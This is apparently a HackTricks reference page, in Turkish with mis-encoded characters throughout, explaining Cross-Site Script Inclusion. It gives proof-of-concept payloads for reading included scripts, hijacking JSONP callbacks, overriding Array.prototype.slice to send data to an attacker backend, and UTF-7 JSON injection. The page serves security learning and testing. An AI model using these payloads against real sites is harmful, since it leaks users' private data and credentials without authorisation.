# XSSI (Cross-Site Script Inclusion)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


## Temel Bilgiler

**Cross-Site Script Inclusion (XSSI)**, HTML'deki `script` etiketinin doÄŸasÄ±ndan kaynaklanan bir gÃ¼venlik aÃ§Ä±ÄŸÄ±dÄ±r. Ã‡oÄŸu kaynaÄŸÄ±n **Same-Origin Policy (SOP)**'ye tabi olmasÄ±nÄ±n aksine, script'ler farklÄ± alanlardan dahil edilebilir. Bu davranÄ±ÅŸ, farklÄ± sunucularda barÄ±ndÄ±rÄ±lan kÃ¼tÃ¼phanelerin ve diÄŸer kaynaklarÄ±n kullanÄ±mÄ±nÄ± kolaylaÅŸtÄ±rmak iÃ§in tasarlanmÄ±ÅŸtÄ±r, ancak aynÄ± zamanda potansiyel bir gÃ¼venlik riski de taÅŸÄ±r.

### **XSSI**'nin Ana Ã–zellikleri:
- **SOP'yi AÅŸma**: Script'ler **Same-Origin Policy**'den muaf tutulur, bu da onlarÄ±n farklÄ± alanlar arasÄ±nda dahil edilmesine olanak tanÄ±r.
- **Veri AÃ§Ä±ÄŸa Ã‡Ä±kma**: Bir saldÄ±rgan, bu davranÄ±ÅŸÄ± kullanarak `script` etiketi aracÄ±lÄ±ÄŸÄ±yla yÃ¼klenen verileri okuyabilir.
- **Dinamik JavaScript/JSONP Ãœzerindeki Etki**: **XSSI**, Ã¶zellikle dinamik JavaScript veya **JSON with Padding (JSONP)** iÃ§in geÃ§erlidir. Bu teknolojiler genellikle kimlik doÄŸrulama iÃ§in "ambient-authority" bilgilerini (Ã§erezler gibi) kullanÄ±r. FarklÄ± bir ana bilgisayara script isteÄŸi yapÄ±ldÄ±ÄŸÄ±nda, bu kimlik bilgileri (Ã¶rneÄŸin, Ã§erezler) isteÄŸe otomatik olarak dahil edilir.
- **Kimlik DoÄŸrulama Token'Ä± SÄ±zÄ±ntÄ±sÄ±**: Bir saldÄ±rgan, bir kullanÄ±cÄ±nÄ±n tarayÄ±cÄ±sÄ±nÄ± kontrol ettikleri bir sunucudan script istemeye kandÄ±rabilirse, bu isteklere dahil olan hassas bilgilere eriÅŸebilir.

### TÃ¼rler

1. **Statik JavaScript** - Bu, XSSI'nin geleneksel formunu temsil eder.
2. **Kimlik DoÄŸrulama ile Statik JavaScript** - Bu tÃ¼r, eriÅŸim iÃ§in kimlik doÄŸrulama gerektirdiÄŸi iÃ§in farklÄ±dÄ±r.
3. **Dinamik JavaScript** - Dinamik olarak iÃ§erik Ã¼reten JavaScript'i iÃ§erir.
4. **JavaScript Olmayan** - DoÄŸrudan JavaScript iÃ§ermeyen gÃ¼venlik aÃ§Ä±klarÄ±nÄ± ifade eder.

**AÅŸaÄŸÄ±daki bilgiler [https://www.scip.ch/en/?labs.20160414](https://www.scip.ch/en/?labs.20160414)** adresinin bir Ã¶zetidir. Daha fazla ayrÄ±ntÄ± iÃ§in kontrol edin.


### Normal XSSI
Bu yaklaÅŸÄ±mda, Ã¶zel bilgiler genel olarak eriÅŸilebilir bir JavaScript dosyasÄ±na gÃ¶mÃ¼lmÃ¼ÅŸtÃ¼r. SaldÄ±rganlar, dosya okuma, anahtar kelime arama veya dÃ¼zenli ifadeler gibi yÃ¶ntemler kullanarak bu dosyalarÄ± tespit edebilir. Bulunduktan sonra, Ã¶zel bilgileri iÃ§eren script, kÃ¶tÃ¼ niyetli iÃ§eriklere dahil edilerek hassas verilere yetkisiz eriÅŸim saÄŸlanabilir. AÅŸaÄŸÄ±da bir Ã¶rnek istismar tekniÄŸi gÃ¶sterilmektedir:
```html
<script src="https://www.vulnerable-domain.tld/script.js"></script>
<script> alert(JSON.stringify(confidential_keys[0])); </script>
```
### Dinamik-JavaScript-tabanlÄ±-XSSI ve Kimlik DoÄŸrulamalÄ±-JavaScript-XSSI
Bu tÃ¼r XSSI saldÄ±rÄ±larÄ±, bir kullanÄ±cÄ±nÄ±n isteÄŸine yanÄ±t olarak gizli bilgilerin dinamik olarak script'e eklenmesini iÃ§erir. Tespit, Ã§erezlerle ve Ã§erez olmadan istekler gÃ¶ndererek ve yanÄ±tlarÄ± karÅŸÄ±laÅŸtÄ±rarak yapÄ±labilir. EÄŸer bilgiler farklÄ±ysa, bu gizli bilgilerin varlÄ±ÄŸÄ±nÄ± gÃ¶sterebilir. Bu sÃ¼reÃ§, [DetectDynamicJS](https://github.com/luh2/DetectDynamicJS) Burp eklentisi gibi araÃ§lar kullanÄ±larak otomatikleÅŸtirilebilir.

EÄŸer gizli veriler bir global deÄŸiÅŸkende saklanÄ±yorsa, bu, Regular XSSI'de kullanÄ±lan benzer yÃ¶ntemlerle istismar edilebilir. Ancak, eÄŸer gizli veriler bir JSONP yanÄ±tÄ±nda yer alÄ±yorsa, saldÄ±rganlar bilgiyi almak iÃ§in geri Ã§aÄŸÄ±rma fonksiyonunu ele geÃ§irebilir. Bu, ya global nesneleri manipÃ¼le ederek ya da JSONP yanÄ±tÄ± tarafÄ±ndan yÃ¼rÃ¼tÃ¼lecek bir fonksiyon kurarak yapÄ±labilir, aÅŸaÄŸÄ±da gÃ¶sterildiÄŸi gibi:
```html
<script>
var angular = function () { return 1; };
angular.callbacks = function () { return 1; };
angular.callbacks._7 = function (leaked) {
alert(JSON.stringify(leaked));
};
</script>
<script src="https://site.tld/p?jsonp=angular.callbacks._7" type="text/javascript"></script>
```

```html
<script>
leak = function (leaked) {
alert(JSON.stringify(leaked));
};
</script>
<script src="https://site.tld/p?jsonp=leak" type="text/javascript"></script>
```
Global ad alanÄ±nda yer almayan deÄŸiÅŸkenler iÃ§in, *prototype tampering* bazen istismar edilebilir. Bu teknik, JavaScript'in tasarÄ±mÄ±nÄ± kullanÄ±r; burada kod yorumlamasÄ±, Ã§aÄŸrÄ±lan Ã¶zelliÄŸi bulmak iÃ§in prototip zincirini geÃ§meyi iÃ§erir. Belirli fonksiyonlarÄ±, Ã¶rneÄŸin `Array`'nin `slice` fonksiyonunu geÃ§ersiz kÄ±larak, saldÄ±rganlar global olmayan deÄŸiÅŸkenlere eriÅŸebilir ve leak edebilir:
```javascript
Array.prototype.slice = function(){
// leaks ["secret1", "secret2", "secret3"]
sendToAttackerBackend(this);
};
```
Daha fazla bilgiye, [Sebastian Lekies](https://twitter.com/slekies) adlÄ± GÃ¼venlik AraÅŸtÄ±rmacÄ±sÄ±nÄ±n Ã§alÄ±ÅŸmalarÄ±nda ulaÅŸÄ±labilir; kendisi bir [vektÃ¶rler](http://sebastian-lekies.de/leak/) listesi tutmaktadÄ±r.

### Non-Script-XSSI
Takeshi Terada'nÄ±n araÅŸtÄ±rmasÄ±, Non-Script dosyalarÄ±nÄ±n, CSV gibi, `script` etiketinde kaynak olarak dahil edilerek cross-origin olarak sÄ±zdÄ±rÄ±ldÄ±ÄŸÄ± baÅŸka bir XSSI biÃ§imini tanÄ±tmaktadÄ±r. Jeremiah Grossmanâ€™Ä±n 2006 yÄ±lÄ±nda tam bir Google adres defterini okumak iÃ§in yaptÄ±ÄŸÄ± saldÄ±rÄ± ve Joe Walkerâ€™Ä±n 2007 JSON veri sÄ±zÄ±ntÄ±sÄ± gibi tarihsel XSSI Ã¶rnekleri, bu tehditlerin ciddiyetini vurgulamaktadÄ±r. AyrÄ±ca, Gareth Heyes, belirli tarayÄ±cÄ±larda etkili olan JSON formatÄ±ndan kaÃ§mak ve script'leri Ã§alÄ±ÅŸtÄ±rmak iÃ§in UTF-7 kodlu JSON iÃ§eren bir saldÄ±rÄ± varyantÄ±nÄ± tanÄ±mlamaktadÄ±r:
```javascript
[{'friend':'luke','email':'+ACcAfQBdADsAYQBsAGUAcgB0ACgAJwBNAGEAeQAgAHQAaABlACAAZgBvAHIAYwBlACAAYgBlACAAdwBpAHQAaAAgAHkAbwB1ACcAKQA7AFsAewAnAGoAbwBiACcAOgAnAGQAbwBuAGU-'}]
```

```html
<script src="http://site.tld/json-utf7.json" type="text/javascript" charset="UTF-7"></script>
```
{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **Bize katÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **bizi** **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
